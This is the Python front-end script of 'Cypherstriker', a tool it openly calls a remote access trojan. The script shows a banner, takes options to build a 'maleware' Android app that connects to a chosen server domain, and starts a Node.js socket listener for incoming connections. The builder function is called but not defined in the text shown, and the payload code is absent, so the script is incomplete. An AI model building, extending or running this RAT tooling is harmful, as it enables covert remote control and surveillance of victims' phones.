import os
import sys
import argparse
import subprocess
import random
import time

os.system("clear")

def typing_animation(text, delay=0.01):
    for char in text:
        print(f"\033[32m{char}\033[0m", end='', flush=True)  # Green color
        time.sleep(delay)
    print()

def print_colored(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")

tool_banner = os.popen("figlet Cypherstriker").read()
color_code = 32  # Green color code

typing_animation(tool_banner, delay=0.01)  # Typing animation for tool banner

author_names = "Authors: HuiHola, David"
author_result = os.popen(f"echo '{author_names}' | figlet -f term").read()

print_colored(author_result, color_code)  # Print author names in green color
import time

def typing_animation(text, delay=0.1, color_code=32):
    for char in text:
        print(f"\033[{color_code}m{char}\033[0m", end='', flush=True)  # Green color
        time.sleep(delay)
    print()

text_to_type = "Welcome to Cypherstriker: REMOTE ACCESS  TROJAN"
typing_animation(text_to_type, color_code=32)  # Using color code 32 for green


commandLine=argparse.ArgumentParser(description = "Welcome to Rama help") #it like create object

#command first
commandLine.add_argument("-b","--build",type=str,help=" -b <true> build maleware app")
commandLine.add_argument("-i","--host",type=str,help="<https> server domain to connect app \n WORING: don't use tcp it take http server domain")
commandLine.add_argument("-l","--listen",type=int,help="<port> where http server is running")
commandLine.add_argument("-o","--output",type=str,default="RAMAapp.apk",help="<filename> save build app as filename")

getCommand=commandLine.parse_args()

def listen():
    port=getCommand.listen
    path=subprocess.getoutput("pwd")
    # os.system('''echo "START LISTINING ...." | lolcat -d 400''')
    print("\n")
    os.system(f"node {path}/Server/socket.js {port}")
if(getCommand.listen):
    listen()
elif(getCommand.build):
    builder()



